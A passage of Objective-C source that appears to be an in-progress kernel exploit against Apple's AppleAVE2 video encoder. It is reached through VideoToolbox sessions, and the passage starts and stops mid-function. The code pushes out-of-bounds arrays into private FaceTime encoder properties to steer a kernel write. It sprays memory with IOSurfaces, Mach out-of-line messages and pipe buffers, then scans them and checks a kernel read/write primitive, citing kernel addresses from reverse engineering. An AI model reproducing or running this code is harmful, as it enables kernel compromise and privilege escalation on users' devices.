            // Re-latch the highest accepted path reaching 0x147b0 (arr8 S0[368..371] or d0 S0[1614..1617])
            if (setArr8 == noErr) VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
            else if (setArr4 == noErr) VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps4);
            else VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ dictD0 ]);
        }
        OSStatus setDpbPost = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
        OSStatus uPostSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
        OSStatus nPostSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(pNtl));
        int rbPostNtl = -1;
        CFNumberRef rbN = NULL;
        if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &rbN) == noErr && rbN) {
            CFNumberGetValue(rbN, kCFNumberIntType, &rbPostNtl);
            CFRelease(rbN);
        }

        // Snapshot all discovered candidate pages (if available) before Inter-frame encode and teardown
        vm_address_t candPages[8] = {0};
        BOOL candValid[8] = {NO};
        uint8_t *candSnapBefore = (uint8_t *)calloc(8, 0x4000);
        uint8_t *candSnapAfter  = (uint8_t *)calloc(8, 0x4000);
        for (int ci = 0; ci < liveKPtrCount && ci < 8; ci++) {
            candPages[ci] = liveVAs[ci] & ~(vm_address_t)0x3fffULL;
            vm_size_t readSz = 0;
            if (candSnapBefore && candPages[ci] &&
                vm_read_overwrite(mach_task_self(), candPages[ci], 0x4000,
                                  (vm_address_t)(candSnapBefore + ci * 0x4000), &readSz) == KERN_SUCCESS &&
                readSz == 0x4000) {
                candValid[ci] = YES;
            }
        }

        // Encode Inter-frame (Frame 1, P-frame) to force AppleAVE2 to consume UserRPSForFaceTime & DPB slot[0]
        OSStatus eP = -1;
        NSString *cbP = @"(no cb)";
        CVPixelBufferRef pbP = [self makeBufferWidth:W height:H];
        if (pbP) {
            @synchronized (vSink) { [vSink removeAllObjects]; }
            NSDictionary *pFrameProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
            eP = VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(1, 30), kCMTimeInvalid,
                                                 (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
            SpriteDrain(victim, vSink, 1, 500);
            @synchronized (vSink) {
                cbP = vSink.firstObject ?: @"(no cb)";
            }
            CVPixelBufferRelease(pbP);
        }

        [report appendFormat:@"pcontrol v3 victim=%p ntl=%d(P=0x%016llx -> x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) enc1=%d(%@) nPost=%d/%d(rb=%d)\n",
         (void *)victim, pNtl, pFullAlign, x0ExpectedAlign, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)eP, cbP, (int)uPostSt, (int)nPostSt, rbPostNtl];
        [report appendFormat:@"pcontrol set d0(S0[1614])=%d arr4(S0[1080])=%d arr8(S0[368])=%d arr10(S0[12])=%d dpb34=%d/%d(oobPair16=0x%016llx)\n",
         (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPre, (int)setDpbPost, rbOobPair16];
        [self journal:[NSString stringWithFormat:@"PCONTROL_V3 ntl=%d d0=%d arr4=%d arr8=%d arr10=%d dpb34=%d enc0=%d(%@) enc1=%d(%@)",
                       pNtl, (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPost, (int)e0, cb0, (int)eP, cbP]];
        VTCompressionSessionInvalidate(victim);
        CFRelease(victim);
        CFRelease(retainedVSink);

        // Check if any candidate remapped page changed during encode or teardown
        int candMutations = 0;
        for (int ci = 0; ci < liveKPtrCount && ci < 8; ci++) {
            vm_size_t readSz = 0;
            if (candValid[ci] && candSnapAfter &&
                vm_read_overwrite(mach_task_self(), candPages[ci], 0x4000,
                                  (vm_address_t)(candSnapAfter + ci * 0x4000), &readSz) == KERN_SUCCESS &&
                readSz == 0x4000) {
                for (size_t bo = 0; bo + 8 <= 0x4000; bo += 8) {
                    uint64_t wB = *(uint64_t *)(candSnapBefore + ci * 0x4000 + bo);
                    uint64_t wA = *(uint64_t *)(candSnapAfter  + ci * 0x4000 + bo);
                    if (wB != wA) {
                        candMutations++;
                        if (candMutations <= 8) {
                            [report appendFormat:@"  [!] CANDIDATE REMAP MUTATION cand[%d] page=0x%lx+0x%zx: 0x%016llx -> 0x%016llx\n",
                             ci, (unsigned long)candPages[ci], bo, wB, wA];
                        }
                    }
                }
            }
        }
        if (candSnapBefore) free(candSnapBefore);
        if (candSnapAfter) free(candSnapAfter);
        if (liveKPtrCount > 0) {
            [report appendFormat:@"pcontrol candPagesChecked=%d mutations=%d\n", liveKPtrCount, candMutations];
        }

        // Scan targeted IOSurface + pipebuf spray for [x0, x0, x0, 0] at page offsets 0x58, 0x59, 0x100, 0x259
        int pcSurfHits = 0, pcPipeHits = 0, pcSigHits = 0;
        if (pSurfArr) {
            CFIndex scount = CFArrayGetCount(pSurfArr);
            for (CFIndex si = 0; si < scount; si++) {
                void *surf = (void *)CFArrayGetValueAtIndex(pSurfArr, si);
                uint32_t seed = 0;
                if (pIsLock(surf, 0, &seed) != 0) continue;
                uint8_t *base = (uint8_t *)pIsGetBase(surf);
                size_t sz = pIsGetSize(surf);
                if (base && sz >= 0x4000) {
                    const size_t probeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
                    for (size_t pg = 0; pg + 0x300 <= sz && pcSurfHits < 8; pg += 0x1000) {
                        for (int oi = 0; oi < 4; oi++) {
                            size_t off = pg + probeOffs[oi];
                            uint64_t s1 = 0, s2 = 0, s3 = 0;
                            uint32_t z = 0;
                            memcpy(&s1, base + off, 8);
                            memcpy(&s2, base + off + 8, 8);
                            memcpy(&s3, base + off + 16, 8);
                            memcpy(&z,  base + off + 24, 4);
                            if (s1 != pMarkerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
                                [report appendFormat:@"  [!] PCONTROL SURFACE SIG surf=%ld page=0x%zx+0x%zx x0=0x%016llx\n",
                                 (long)si, pg, probeOffs[oi], s1];
                                pcSurfHits++;
                                pcSigHits++;
                            }
                        }
                    }
                }
                pIsUnlock(surf, 0, &seed);
            }
            CFRelease(pSurfArr);
        }
        for (int p = 0; p < 64; p++) {
            if (pPipes[p][0] < 0) continue;
            uint8_t *pbuf = (uint8_t *)malloc(512 * 1024);
            if (pbuf) {
                ssize_t got = read(pPipes[p][0], pbuf, 512 * 1024);
                if (got >= 4096) {
                    const size_t probeOffs[4] = { 0x58, 0x59, 0x100, 0x259 };
                    for (size_t pg = 0; pg + 0x300 <= (size_t)got && pcPipeHits < 8; pg += 4096) {
                        for (int oi = 0; oi < 4; oi++) {
                            size_t off = pg + probeOffs[oi];
                            uint64_t s1 = 0, s2 = 0, s3 = 0;
                            uint32_t z = 0;
                            memcpy(&s1, pbuf + off, 8);
                            memcpy(&s2, pbuf + off + 8, 8);
                            memcpy(&s3, pbuf + off + 16, 8);
                            memcpy(&z,  pbuf + off + 24, 4);
                            if (s1 != pMarkerPair && s1 != 0 && s1 == s2 && s2 == s3 && z == 0) {
                                // Live pipebuf KRW round-trip verification on the hit pipe
                                uint64_t krwProbe = s1 ^ 0x00000000cafebabeULL;
                                memcpy(pbuf + off, &krwProbe, 8);
                                ssize_t wr = write(pPipes[p][1], pbuf + pg, 4096);
                                uint64_t krwReadback = 0;
                                if (wr >= 4096) {
                                    uint8_t rdb[4096];
                                    if (read(pPipes[p][0], rdb, 4096) >= (ssize_t)(probeOffs[oi] + 8)) {
                                        memcpy(&krwReadback, rdb + probeOffs[oi], 8);
                                    }
                                }
                                [report appendFormat:@"  [!] PCONTROL PIPEBUF KRW HIT pipe=%d page=0x%zx+0x%zx x0=0x%016llx rwVerify=0x%016llx\n",
                                 p, pg, probeOffs[oi], s1, krwReadback];
                                pcPipeHits++;
                                pcSigHits++;
                            }
                        }
                    }
                }
                free(pbuf);
            }
            close(pPipes[p][0]);
            close(pPipes[p][1]);
        }
        if (pTile) free(pTile);
        [report appendFormat:@"pcontrol v3 spray scan: surf_hits=%d pipe_hits=%d sig_hits=%d\n",
         pcSurfHits, pcPipeHits, pcSigHits];
        [report appendString:@"pcontrol v3 teardown SURVIVED — RPS/DPB offset ladder + pipebuf/IOSurface scan complete\n"];
        [report appendString:@"\nVERDICT: PCONTROL_SURVIVED\n"];
        return report;
    }

    // One victim per safe 4GB boundary (mapped per panic-full zone map): each NTL
    // steers x0 to a different 0xXXXX00000059 slot — 7 shots per run, not 1.
    NSMutableArray *victims = [NSMutableArray array];
    NSMutableArray *uVictims = [NSMutableArray array];
    NSMutableArray *vSinks = [NSMutableArray array];
    NSMutableArray *vRetains = [NSMutableArray array];
    NSMutableArray *vNtls = [NSMutableArray array];
    int ladderNtls[] = { ntl, 16429, 16430, 16431, 16432, 16444, 16446 };
    for (int li = 0; li < (int)(sizeof(ladderNtls) / sizeof(ladderNtls[0])); li++) {
        int vntl = ladderNtls[li];
        if (li > 0 && vntl == ntl) continue;
        VTCompressionSessionRef victim = NULL;
        NSMutableArray *vSink = [NSMutableArray array];
        CFTypeRef retainedVSink = CFRetain((__bridge CFTypeRef)vSink);
        NSDictionary *vSpec = @{ @"EnableUserRefForFacetime": @YES };
        OSStatus vst = VTCompressionSessionCreate(kCFAllocatorDefault, W, H,
                                                  kCMVideoCodecType_HEVC,
                                                  (__bridge CFDictionaryRef)vSpec, NULL, NULL,
                                                  SpriteAttsCB, (void *)retainedVSink, &victim);
        if (vst != noErr || !victim) {
            CFRelease(retainedVSink);
            [report appendFormat:@"victim NTL=%d create failed=%d\n", vntl, (int)vst];
            continue;
        }
        VTSessionSetProperty(victim, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(victim, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
        // Companion Usage=1 session for unclamped pre-prepare AVE_PSGen::Init (fn#1816) NTL write.
        // Must explicitly call VTSessionSetProperty(uVictim, "EncoderUsage", @1) BEFORE setting
        // NumberOfTemporalLayers so [x19 + 0x1a0d8] == 1 and SetNumberOfTemporalLayers accepts vntl > 4.
        VTCompressionSessionRef uVictim = NULL;
        int u1Pre = -1, u1Post = -1;
        OSStatus u1Prep = -999;
        if (vntl < 16463) {
            if (VTCompressionSessionCreate(kCFAllocatorDefault, W, H, kCMVideoCodecType_HEVC,
                                           NULL, NULL, NULL, NULL, NULL, &uVictim) == noErr && uVictim) {
                VTSessionSetProperty(uVictim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(uVictim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                VTSessionSetProperty(uVictim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
                VTSessionSetProperty(uVictim, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                VTSessionSetProperty(uVictim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
                CFNumberRef urb = NULL;
                if (VTSessionCopyProperty(uVictim, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
                    CFNumberGetValue(urb, kCFNumberIntType, &u1Pre);
                    CFRelease(urb);
                }
                u1Prep = VTCompressionSessionPrepareToEncodeFrames(uVictim);
                urb = NULL;
                if (VTSessionCopyProperty(uVictim, CFSTR("NumberOfTemporalLayers"), NULL, &urb) == noErr && urb) {
                    CFNumberGetValue(urb, kCFNumberIntType, &u1Post);
                    CFRelease(urb);
                }
            }
        }
        OSStatus pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
        OSStatus rtSt = VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
        OSStatus uSt = 0;
        OSStatus privNSt = 0;
        int effPreNtl = (vntl >= 1 && vntl <= 7) ? vntl : 7;
        if (vntl >= 16463) {
            uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
            privNSt = VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(vntl));
            effPreNtl = vntl;
        } else {
            VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanTrue);
            VTSessionSetProperty(victim, kVTCompressionPropertyKey_AllowTemporalCompression, kCFBooleanTrue);
            VTSessionSetProperty(victim, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@15);
            uSt = VTSessionSetProperty(victim, CFSTR("BaseLayerFrameRate"), (__bridge CFNumberRef)@30);
        }
        OSStatus nSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(effPreNtl));
        int vrbPre = -1, vrbPost = -1;
        CFNumberRef vbn = NULL;
        if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
            CFNumberGetValue(vbn, kCFNumberIntType, &vrbPre);
            CFRelease(vbn);
        }
        OSStatus vPrep = VTCompressionSessionPrepareToEncodeFrames(victim);
        vbn = NULL;
        if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &vbn) == noErr && vbn) {
            CFNumberGetValue(vbn, kCFNumberIntType, &vrbPost);
            CFRelease(vbn);
        }
        int seqSubLayersM1 = (vrbPost < 2 && effPreNtl >= 2) ? (effPreNtl - 1) : (vrbPost - 1);
        [self journal:[NSString stringWithFormat:@"VICTIM_CREATED session=%p ntl=%d pm=%d frac15_30=%d rt=%d set=%d pre=%d prep=%d post=%d seqM1=%d u1=%d/%d/%d",
                       (void *)victim, vntl, (int)pmSt, (int)uSt, (int)rtSt, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1, u1Pre, (int)u1Prep, u1Post]];
        [report appendFormat:@"victim session created (%p) before spray: NTL=%d x0=0x%016llx pm=%d frac15_30=%d rt=%d set=%d PRE=%d prep=%d POST=%d([+0x2eec]=%d) | u1(PRE=%d,prep=%d,POST=%d)\n",
         (void *)victim, vntl,
         ((uint64_t)(uint32_t)(vntl - 16463) << 32) | 0x59ULL,
         (int)pmSt, (int)uSt, (int)rtSt, (int)nSt, vrbPre, (int)vPrep, vrbPost, seqSubLayersM1, u1Pre, (int)u1Prep, u1Post];
        [victims addObject:[NSValue valueWithPointer:victim]];
        [uVictims addObject:[NSValue valueWithPointer:uVictim]];
        [vSinks addObject:vSink];
        [vRetains addObject:[NSValue valueWithPointer:(void *)retainedVSink]];
        [vNtls addObject:@(vntl)];
    }
    if (victims.count == 0) {
        [report appendString:@"\nVERDICT: VICTIM_SESSION_FAILED\n"];
        return report;
    }

    // 2) SPRAY siblings — arm with PropertyMode=1, EnableUserRefForFacetime=YES,
    //    UserDPBFramesForFaceTime (34 int32s including OOB pair #16 carrying x0cands),
    //    and UserRPSForFaceTime (inner OOB 32 + outer OOB arr8 into pINS+0x1406c..0x145fc).
    //    NOTE: Do NOT set EncoderUsage=1 together with EnableUserRefForFacetime (triggers -17691
    //    on PrepareToEncodeFrames), and use valid 60/15 FPS so PrepareToEncodeFrames succeeds!
    int32_t marker = (int32_t)self.marker;
    NSMutableArray *siblings = [NSMutableArray array];
    int sibPrepOk = 0;
    for (int i = 0; i < self.sprayCount; i++) {
        VTCompressionSessionRef s = [self makeSessionWidth:sw height:sh];
        if (!s) continue;
        uint64_t cand64 = x0cands[i % ncand];
        uint32_t cLo = (uint32_t)(cand64 & 0xffffffffULL);
        uint32_t cHi = (uint32_t)(cand64 >> 32);
        VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
        VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        VTSessionSetProperty(s, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
        VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
        VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@3);
        VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
        VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));

        // Prepare session BEFORE setting raw x0cand halves into UserDPBFramesForFaceTime so
        // SetDPBSnapShot during PrepareToEncodeFrames does not fail IOSurfaceLookup (-17691).
        if (VTCompressionSessionPrepareToEncodeFrames(s) == noErr) {
            sibPrepOk++;
        }

        NSMutableArray *dpb34 = [NSMutableArray arrayWithCapacity:34];
        for (int p = 0; p < 17; p++) {
            [dpb34 addObject:@((int32_t)cLo)];
            [dpb34 addObject:@((int32_t)cHi)];
        }
        VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);

        // Full 64-bit P (cand64 - 0x58 -> P_low=0x01 or aligned P_low=0xa8) across 4 int16_t halfwords,
        // with dict#7 (pINS+0x14498) extended to 376 elements so S0[368..371] lands on slot[0] (+0x147b0..0x147b7).
        uint64_t pCand64 = (cand64 & 0xffffffffffffc000ULL) | 0x0001ULL;
        int16_t pHw[4] = {
            (int16_t)(pCand64 & 0xffffULL),
            (int16_t)((pCand64 >> 16) & 0xffffULL),
            (int16_t)((pCand64 >> 32) & 0xffffULL),
            (int16_t)((pCand64 >> 48) & 0xffffULL)
        };
        NSMutableArray *s0Oob32 = [NSMutableArray arrayWithCapacity:32];
        NSMutableArray *s1Oob32 = [NSMutableArray arrayWithCapacity:32];
        for (int k = 0; k < 32; k++) {
            [s0Oob32 addObject:@(pHw[k & 3])];
            [s1Oob32 addObject:@(pHw[k & 3])];
        }
        NSMutableArray *s0Slot0_376 = [NSMutableArray arrayWithCapacity:376];
        for (int k = 0; k < 376; k++) {
            [s0Slot0_376 addObject:@(pHw[k & 3])];
        }
        NSDictionary *rpsOob = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @2,
            @"DeltaPOCS0Minus1": s0Oob32,
            @"UsedByCurrPicS0Flag": @3,
            @"DeltaPOCS1Minus1": s1Oob32,
            @"UsedByCurrPicS1Flag": @3,
        };
        NSDictionary *rpsOobSlot0 = @{
            @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
            @"NumNegativePics": @2,
            @"NumPositivePics": @2,
            @"DeltaPOCS0Minus1": s0Slot0_376,
            @"UsedByCurrPicS0Flag": @3,
            @"DeltaPOCS1Minus1": s1Oob32,
            @"UsedByCurrPicS1Flag": @3,
        };
        VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"),
                             (__bridge CFTypeRef)@[ rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOob, rpsOobSlot0 ]);
        [siblings addObject:[NSValue valueWithPointer:s]];
    }
    [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d prepOk=%d marker=0x%08x ntl=%d",
                   (int)siblings.count, sibPrepOk, self.marker, ntl]];

    // Dense fixed-page spray (strategy doc): own the pages at 0xfffffeXX00000059
    // so a steered write lands in OUR buffers and can be scanned afterwards.
    typedef void *(*SpriteISCreateFn)(CFDictionaryRef);
    typedef int (*SpriteISLockFn)(void *, uint32_t, uint32_t *);
    typedef int (*SpriteISUnlockFn)(void *, uint32_t, uint32_t *);
    typedef void *(*SpriteISGetBaseFn)(void *);
    typedef size_t (*SpriteISGetSizeFn)(void *);
    void *isLib = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    SpriteISCreateFn sIsCreate = isLib ? (SpriteISCreateFn)dlsym(isLib, "IOSurfaceCreate") : NULL;
    SpriteISLockFn sIsLock = isLib ? (SpriteISLockFn)dlsym(isLib, "IOSurfaceLock") : NULL;
    SpriteISUnlockFn sIsUnlock = isLib ? (SpriteISUnlockFn)dlsym(isLib, "IOSurfaceUnlock") : NULL;
    SpriteISGetBaseFn sIsGetBase = isLib ? (SpriteISGetBaseFn)dlsym(isLib, "IOSurfaceGetBaseAddress") : NULL;
    SpriteISGetSizeFn sIsGetSize = isLib ? (SpriteISGetSizeFn)dlsym(isLib, "IOSurfaceGetAllocSize") : NULL;
    uint64_t markerPair = ((uint64_t)(uint32_t)self.marker << 32) | (uint32_t)self.marker;
    CFMutableArrayRef surfArray = NULL;
    if (sIsCreate && sIsLock && sIsUnlock && sIsGetBase && sIsGetSize) {
        surfArray = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        for (int s = 0; s < 64; s++) {
            NSDictionary *props = @{
                @"IOSurfaceWidth": @1024, @"IOSurfaceHeight": @2048,
                @"IOSurfaceBytesPerElement": @4, @"IOSurfacePixelFormat": @0x42475241,
            };
            void *surf = sIsCreate((__bridge CFDictionaryRef)props);
            if (surf) {
                uint32_t seed = 0;
                if (sIsLock(surf, 0, &seed) == 0) {
                    uint8_t *base = (uint8_t *)sIsGetBase(surf);
                    size_t sz = sIsGetSize(surf);
                    if (base && sz >= 0x4000) {
                        for (size_t pg = 0; pg + 0x300 <= sz; pg += 0x1000) {
                            uint64_t *pw = (uint64_t *)(base + pg);
                            for (int wi = 0; wi < 96; wi++) pw[wi] = markerPair;
                            memset(base + pg + 0x48, 0, 16);
                            memset(base + pg + 0xf0, 0, 16);
                            memset(base + pg + 0x248, 0, 16);
                        }
                    }
                    sIsUnlock(surf, 0, &seed);
                }
                CFArrayAppendValue(surfArray, surf);
                CFRelease(surf);
            }
        }
    }
    [report appendFormat:@"fixed-page spray: %ld surfaces\n",
     surfArray ? (long)CFArrayGetCount(surfArray) : 0L];

    // kfree-chain-safe tile: if the steered write lands here, teardown reads N at
    // P+0x48 and X1 at P+0x50 (page-local 0x49/0x51, 0xf0/0xf8, or 0x248/0x250). Zeroing those offsets
    // forces X1=NULL so the kfree is skipped (cbz) — a hit stays a clean signature.
    uint8_t *tile = (uint8_t *)malloc(256 * 1024);
    if (tile) {
        uint64_t *tq = (uint64_t *)tile;
        for (size_t ti = 0; ti < 256 * 1024 / 8; ti++) tq[ti] = markerPair;
        for (size_t pg = 0; pg < 256 * 1024; pg += 4096) {
            memset(tile + pg + 0x48, 0, 16);
            memset(tile + pg + 0xf0, 0, 16);
            memset(tile + pg + 0x248, 0, 16);
        }
    }
    mach_port_t oolPorts[128];
    int oolPortCount = 0, oolQueued = 0;
    for (int p = 0; p < 128; p++) {
        oolPorts[p] = MACH_PORT_NULL;
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &oolPorts[p]) != KERN_SUCCESS) continue;
        mach_port_insert_right(mach_task_self(), oolPorts[p], oolPorts[p], MACH_MSG_TYPE_MAKE_SEND);
        oolPortCount++;
    }
    if (tile && oolPortCount) {
        for (int p = 0; p < oolPortCount; p++) {
            for (int m = 0; m < 8; m++) {
                size_t total = sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t) + sizeof(mach_msg_ool_descriptor_t);
                uint8_t *msg = calloc(1, total);
                mach_msg_header_t *hdr = (mach_msg_header_t *)msg;
                hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
                hdr->msgh_size = (mach_msg_size_t)total;
                hdr->msgh_remote_port = oolPorts[p];
                hdr->msgh_local_port = MACH_PORT_NULL;
                hdr->msgh_id = 0x5350;
                mach_msg_body_t *body = (mach_msg_body_t *)(msg + sizeof(mach_msg_header_t));
                body->msgh_descriptor_count = 1;
                mach_msg_ool_descriptor_t *od =
                    (mach_msg_ool_descriptor_t *)(msg + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
                od->address = tile;
                od->size = 256 * 1024;
                od->deallocate = 0;
                od->copy = MACH_MSG_PHYSICAL_COPY;
                od->type = MACH_MSG_OOL_DESCRIPTOR;
                kern_return_t okr = mach_msg((mach_msg_header_t *)msg, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                             (mach_msg_size_t)total, 0, MACH_PORT_NULL, 50, MACH_PORT_NULL);
                if (okr == KERN_SUCCESS) oolQueued++;
                free(msg);
            }
        }
    }
    [report appendFormat:@"ool kernel-copy spray: %d ports, %d queued x 256KB\n", oolPortCount, oolQueued];

    int pipeFds[64][2];
    int pipesMade = 0;
    for (int p = 0; p < 64; p++) {
        pipeFds[p][0] = pipeFds[p][1] = -1;
        if (pipe(pipeFds[p]) != 0) continue;
        fcntl(pipeFds[p][1], F_SETPIPE_SZ, 512 * 1024); // ignored if unsupported
        fcntl(pipeFds[p][1], F_SETFL, O_NONBLOCK);
        ssize_t wsum = 0;
        if (tile) {
            wsum += write(pipeFds[p][1], tile, 256 * 1024);
            wsum += write(pipeFds[p][1], tile, 256 * 1024);
        }
        if (wsum > 0) pipesMade++;
    }
    [report appendFormat:@"pipe spray: %d x 512KB\n", pipesMade];

    // 3) FIRE FIRST ENCODE AND TEARDOWN VICTIM BEFORE SCANNING SPRAY
    //    Confirmed by static RE (AVE-112705-EXPLOIT.md Section 4):
    //    The 28-byte self-fill (stp x0,x0,[x0]; str x0,[x0,#0x10]; str wzr,[x0,#0x18]
    //    at 0xfffffff008579420) executes during AppleAVE2 slot teardown
    //    (0xfffffff0085df654 -> 0xfffffff00868f48c -> 0xfffffff00868f28c).
    //    Therefore we MUST invalidate/release `victim` BEFORE scanning and freeing
    //    the IOSurface / OOL / pipe spray!
    CVPixelBufferRef pb = [self makeBufferWidth:W height:H];
    for (NSUInteger vi = 0; vi < victims.count; vi++) {
        VTCompressionSessionRef victim = (VTCompressionSessionRef)((NSValue *)victims[vi]).pointerValue;
        VTCompressionSessionRef uVictim = (VTCompressionSessionRef)((NSValue *)uVictims[vi]).pointerValue;
        NSMutableArray *vSink = vSinks[vi];
        CFTypeRef retainedVSink = (CFTypeRef)((NSValue *)vRetains[vi]).pointerValue;
        int vntl = [vNtls[vi] intValue];
        uint64_t vx0 = ((uint64_t)(uint32_t)(vntl - 16463) << 32) | 0x59ULL;
        [self journal:[NSString stringWithFormat:@"BEFORE_VICTIM_ENCODE ntl=%d x0=0x%016llx", vntl, vx0]];
        if (pb) {
            @synchronized (vSink) { [vSink removeAllObjects]; }
            OSStatus e0 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(0, 30), kCMTimeInvalid,
                                                          NULL, NULL, NULL);
            if (e0 == noErr) {
                SpriteDrain(victim, vSink, 1, 500);
            }
            NSString *cb0 = nil;
            @synchronized (vSink) { cb0 = vSink.firstObject ?: @"(no cb)"; }

            // Write full 64-bit P_align into slot[0] (+0x147b0) via UserRPSForFaceTime arr8 S0[368..371]
            uint64_t vBaseKPtr = (liveKPtrCount > 0 && ((liveKPtrs[0] >> 32) == (vx0 >> 32)))
                ? liveKPtrs[0]
                : vx0;
            uint64_t vPAlign = (vBaseKPtr & 0xffffffffffffc000ULL) | 0x00a8ULL;
            int16_t vHw[4] = {
                (int16_t)(vPAlign & 0xffffULL),
                (int16_t)((vPAlign >> 16) & 0xffffULL),
                (int16_t)((vPAlign >> 32) & 0xffffULL),
                (int16_t)((vPAlign >> 48) & 0xffffULL)
            };
            NSMutableArray *vS0Short = [NSMutableArray arrayWithCapacity:32];
            for (int k = 0; k < 32; k++) [vS0Short addObject:@(vHw[k & 3])];
            NSMutableArray *vS0Slot0 = [NSMutableArray arrayWithCapacity:376];
            for (int k = 0; k < 376; k++) [vS0Slot0 addObject:@(vHw[k & 3])];
            NSDictionary *vRpsShort = @{
                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                @"NumNegativePics": @2, @"NumPositivePics": @2,
                @"DeltaPOCS0Minus1": vS0Short, @"UsedByCurrPicS0Flag": @3,
                @"DeltaPOCS1Minus1": @[ @(vHw[0]), @(vHw[1]) ], @"UsedByCurrPicS1Flag": @3,
            };
            NSDictionary *vRpsHit = @{
                @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                @"NumNegativePics": @2, @"NumPositivePics": @2,
                @"DeltaPOCS0Minus1": vS0Slot0, @"UsedByCurrPicS0Flag": @3,
                @"DeltaPOCS1Minus1": @[ @(vHw[0]), @(vHw[1]) ], @"UsedByCurrPicS1Flag": @3,
            };
            OSStatus stRps = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"),
                                                  (__bridge CFTypeRef)@[ vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsHit ]);
            OSStatus stPostUsage = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
            OSStatus stPostPub = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
            int postEncNtl = -1;
            CFNumberRef rbPost = NULL;
            if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &rbPost) == noErr && rbPost) {
                CFNumberGetValue(rbPost, kCFNumberIntType, &postEncNtl);
                CFRelease(rbPost);
            }
            OSStatus e1 = -1;
            NSString *cb1 = @"(skip)";
            if (vntl < 16463) {
                @synchronized (vSink) { [vSink removeAllObjects]; }
                NSDictionary *pFrameProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
                e1 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                     (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
